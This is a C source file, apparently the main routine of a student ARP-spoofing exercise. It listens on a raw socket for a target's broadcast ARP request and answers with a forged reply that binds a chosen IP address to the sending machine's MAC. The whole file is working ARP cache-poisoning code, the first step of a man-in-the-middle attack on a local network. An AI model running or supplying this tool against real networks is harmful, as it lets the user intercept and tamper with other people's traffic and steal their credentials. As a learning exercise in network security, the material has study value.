#include "malcolm.h"

int main(int argc, char *argv[]) 
{
    struct Malcolm malcolm;
    char buffer[1024];

    //check parsing of arguments and fill ip address
    if(!verify_arguments(argc, argv, &malcolm))
        return(1);

    // Get IP and MAC of the poisoning computer
    if(!get_interface(&malcolm))
    {
        printf("No matching interface found for the given IP addresses.\n");
        freeifaddrs(malcolm.ifaddr);
        return(1);
    }

    // SOCK_RAW for direct packet manipulation
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0)
    {
        printf("error socket: %s",strerror(errno));
        freeifaddrs(malcolm.ifaddr);
        return(errno);
    }
    
    // Optimize socket for faster processing
    if(optimize_socket(sockfd) < 0)
    {
        printf("Warning: Could not optimize socket settings\n");
    }
    
    // Apply BPF filter to only receive ARP packets (reduces overhead)
    if(setup_bpf_filter(sockfd) < 0)
    {
        printf("Warning: Could not setup BPF filter\n");
    }
    
    // Pre-build ARP response template for faster response
    unsigned char response_template[42];
    ft_memset(response_template, 0, 42);
    
    struct ethhdr *eth_template = (struct ethhdr *)response_template;
    struct arp_header *arp_template = (struct arp_header *)(response_template + sizeof(struct ethhdr));
    
    // Pre-fill static parts of the response
    eth_template->h_proto = htons(ETH_P_ARP);
    ft_memcpy(eth_template->h_source, malcolm.interfaceMac->sll_addr, ETH_ALEN);
    
    arp_template->hardware_type = htons(1); // ethernet
    arp_template->protocol_type = htons(ETH_P_IP);
    arp_template->hardware_len = 6;
    arp_template->protocol_len = 4;
    arp_template->opcode = htons(0x02); // ARP reply
    ft_memcpy(arp_template->sender_mac, malcolm.interfaceMac->sll_addr, ETH_ALEN);
    ft_memcpy(arp_template->sender_ip, &malcolm.srcaddr.sin_addr.s_addr, 4);

    printf("listening...\n");
    while(1) {
        ssize_t packet_len = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);

        if(packet_len == -1) {
            perror("Packet receive failed");
            continue;
        }

        // cast the buffer from the actual packet into an eth structure
        struct ethhdr *eth = (struct ethhdr *)buffer;
        //check if its an ARP packet (BPF filter should already do this, but double-check)
        if(ntohs(eth->h_proto) == ETH_P_ARP) 
        {
            //create an arp_header skipping the ethernet header
            struct  arp_header *arp = (struct arp_header *)(buffer + sizeof(struct ethhdr));
            unsigned int uintsrc, uinttarg;
            ft_memcpy(&uinttarg, arp->sender_ip, 4);
            ft_memcpy(&uintsrc, arp->target_ip, 4);

            printf("Received ARP packet of size %ld: SRC IP %d.%d.%d.%d -> TARG IP %d.%d.%d.%d\n",
                packet_len, arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3],
                arp->target_ip[0], arp->target_ip[1], arp->target_ip[2], arp->target_ip[3]);

            if(eth->h_dest[0] == 0xFF && eth->h_dest[1] == 0xFF && eth->h_dest[2] == 0xFF &&
                eth->h_dest[3] == 0xFF && eth->h_dest[4] == 0xFF && eth->h_dest[5] == 0xFF)
            {
                printf("Broadcast ARP Request detected.\n");
                if(uintsrc == malcolm.srcaddr.sin_addr.s_addr && uinttarg == malcolm.targetaddr.sin_addr.s_addr)
                {
                    // Use pre-built template and only fill in dynamic parts
                    unsigned char buffersend[42];
                    ft_memcpy(buffersend, response_template, 42);
                    
                    struct ethhdr *ethsend = (struct ethhdr *)buffersend;
                    struct arp_header *arpsend = (struct arp_header *)(buffersend + sizeof(struct ethhdr));
                    
                    // Fill in dynamic parts (destination MAC and target info)
                    ft_memcpy(ethsend->h_dest, eth->h_source, ETH_ALEN);
                    ft_memcpy(arpsend->target_mac, arp->sender_mac, ETH_ALEN);
                    ft_memcpy(arpsend->target_ip, arp->sender_ip, 4);
                    
                    // create the destination address struct
                    struct sockaddr_ll address_response = {0};
                    fill_sockaddr_ll(&address_response, malcolm.index_interface, eth->h_source);

                    //sending response
                    printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
                    int size = sendto(sockfd, buffersend, 42, 0, (struct sockaddr *)&address_response, sizeof(address_response));
                    if(size < 0){
                        printf("Error sending packet: %s\n", strerror(errno));
                        continue;
                    }
                    else
                    {
                        printf("Exiting Program.\n");
                        close(sockfd);
                        freeifaddrs(malcolm.ifaddr);
                        return 0;
                    }
                }
            }
        }
    }
    close(sockfd);
    freeifaddrs(malcolm.ifaddr);
    return(1);
}
